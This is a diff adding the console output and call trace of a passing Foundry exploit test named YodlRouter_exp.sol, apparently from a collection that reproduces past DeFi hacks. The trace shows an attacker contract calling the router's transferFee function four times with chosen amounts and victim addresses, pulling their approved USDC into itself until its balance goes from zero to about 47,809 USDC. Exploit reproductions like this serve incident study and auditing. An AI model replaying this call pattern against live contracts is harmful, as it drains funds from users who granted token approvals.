@@ -1,0 +1,69 @@
+No files changed, compilation skipped
+
+Ran 1 test for src/test/2024-08/YodlRouter_exp.sol:NoName
+[PASS] testExploit() (gas: 135520)
+Logs:
+  Attacker USDC Balance Before exploit: 0.000000
+  Attacker USDC Balance After exploit: 47809.355551
+
+Traces:
+  [154720] NoName::testExploit()
+    ├─ [10370] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::symbol() [staticcall]
+    │   ├─ [3081] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::symbol() [delegatecall]
+    │   │   └─ ← [Return] "USDC"
+    │   └─ ← [Return] "USDC"
+    ├─ [3339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [3164] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::decimals() [staticcall]
+    │   ├─ [2381] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Attacker USDC Balance Before exploit", val: 0, decimals: 6)
+    ├─ [42238] 0xE3A0bc3483AE5a04DB7eF2954315133a6F7D228E::transferFee(45588747326 [4.558e10], 10000 [1e4], 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [40049] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 45588747326 [4.558e10])
+    │   │   ├─ [39254] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 45588747326 [4.558e10]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0, to: NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 45588747326 [4.558e10])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000a9d4d143e
+    ├─ [18338] 0xE3A0bc3483AE5a04DB7eF2954315133a6F7D228E::transferFee(1219608225 [1.219e9], 10000 [1e4], 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [16149] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1219608225 [1.219e9])
+    │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1219608225 [1.219e9]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E, to: NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1219608225 [1.219e9])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000048b1bea1
+    ├─ [18338] 0xE3A0bc3483AE5a04DB7eF2954315133a6F7D228E::transferFee(1000000000 [1e9], 10000 [1e4], 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x2c349022df145C1a2eD895B5577905e6F1Bc7881, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [16149] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(0x2c349022df145C1a2eD895B5577905e6F1Bc7881, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000 [1e9])
+    │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x2c349022df145C1a2eD895B5577905e6F1Bc7881, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000 [1e9]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x2c349022df145C1a2eD895B5577905e6F1Bc7881, to: NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000 [1e9])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003b9aca00
+    ├─ [18338] 0xE3A0bc3483AE5a04DB7eF2954315133a6F7D228E::transferFee(1000000 [1e6], 10000 [1e4], 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x96D0F726FD900E199680277aAaD326fbdebc6BF9, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [16149] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(0x96D0F726FD900E199680277aAaD326fbdebc6BF9, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000 [1e6])
+    │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x96D0F726FD900E199680277aAaD326fbdebc6BF9, NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000 [1e6]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x96D0F726FD900E199680277aAaD326fbdebc6BF9, to: NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000 [1e6])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000f4240
+    ├─ [1870] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::symbol() [staticcall]
+    │   ├─ [1081] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::symbol() [delegatecall]
+    │   │   └─ ← [Return] "USDC"
+    │   └─ ← [Return] "USDC"
+    ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(NoName: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 47809355551 [4.78e10]
+    │   └─ ← [Return] 47809355551 [4.78e10]
+    ├─ [1164] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::decimals() [staticcall]
+    │   ├─ [381] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Attacker USDC Balance After exploit", val: 47809355551 [4.78e10], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 336.50ms (2.56ms CPU time)
+
+Ran 1 test suite in 348.64ms (336.50ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
